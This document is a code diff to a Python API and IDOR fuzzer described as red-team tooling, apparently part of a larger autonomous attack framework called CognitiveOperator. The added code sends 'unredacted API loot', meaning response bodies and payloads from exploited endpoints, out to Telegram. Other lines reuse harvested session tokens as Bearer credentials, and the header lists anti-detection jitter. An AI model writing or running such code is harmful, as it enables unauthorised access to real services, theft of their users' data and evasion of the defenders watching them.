@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
-API_FUZZER.PY v3.0 — Senior Red-Team Asynchronous API & IDOR Fuzzer
+API_FUZZER.PY v8.0 — Senior Red-Team Asynchronous API & IDOR Fuzzer (With Telegram Telemetry)
 Features:
-- 100% Async integration with CognitiveOperator v14.0 transport and memory
+- 100% Async integration with CognitiveOperator transport and memory
 - Multi-method request support (GET, POST, PUT, DELETE) with IDOR/BOLA payload mutation
 - Consumes harvested session tokens from the cognitive brain automatically
 - Dynamic endpoint discovery / OpenAPI spec parsing
 - Anti-detection behavioral jitter & response differential analysis
+- Real-time asynchronous Telegram notification dispatch for unredacted API loot
 """
 
 import asyncio
@@ -14,6 +15,20 @@ import json
 import random
 import sys
 import httpx
+
+# Import centralized Telegram broadcaster
+from modules.telegram_notifier import send_telegram_alert
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from asynchronous fuzzer functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 class APIFuzzer:
     def __init__(self, cognitive_operator, base_url: str):
@@ -57,7 +72,6 @@ class APIFuzzer:
         # Gather persisted session tokens from CognitiveOperator brain
         auth_headers = {}
         if hasattr(self.brain, "session_tokens") and self.brain.session_tokens:
-            # Inject latest harvested token or cookie
             for tk_endpoint, token_val in self.brain.session_tokens.items():
                 if isinstance(token_val, str) and len(token_val) < 250:
                     auth_headers["Authorization"] = f"Bearer {token_val}"
@@ -98,7 +112,7 @@ class APIFuzzer:
                     sys.stdout.write(f"\033[91m[-] Fuzzer request error on {method} {endpoint}: {exc}\033[0m\n")
 
     async def _evaluate_response(self, endpoint: str, method: str, status: int, body: str, payload: dict):
-        """Analyzes response for IDOR, BOLA, or data leakage and logs to cognitive memory."""
+        """Analyzes response for IDOR, BOLA, or data leakage, logs to cognitive memory, and broadcasts to Telegram."""
         lower_body = body.lower()
         
         is_spa = (
@@ -118,10 +132,13 @@ class APIFuzzer:
                 "method": method,
                 "status": status,
                 "payload": payload,
-                "evidence": body[:300],
+                "evidence": body[:400],
                 "module": "api_fuzzer"
             }
             
+            # BROADCAST UNREDACTED API LOOT STRAIGHT TO TELEGRAM
+            broadcast_tg_alert_sync(f"API Vulnerability Confirmed [{method}]", loot_entry)
+
             # Feed back directly into CognitiveOperator memory
             if hasattr(self.brain, "memory_context"):
                 self.brain.memory_context.append(loot_entry)
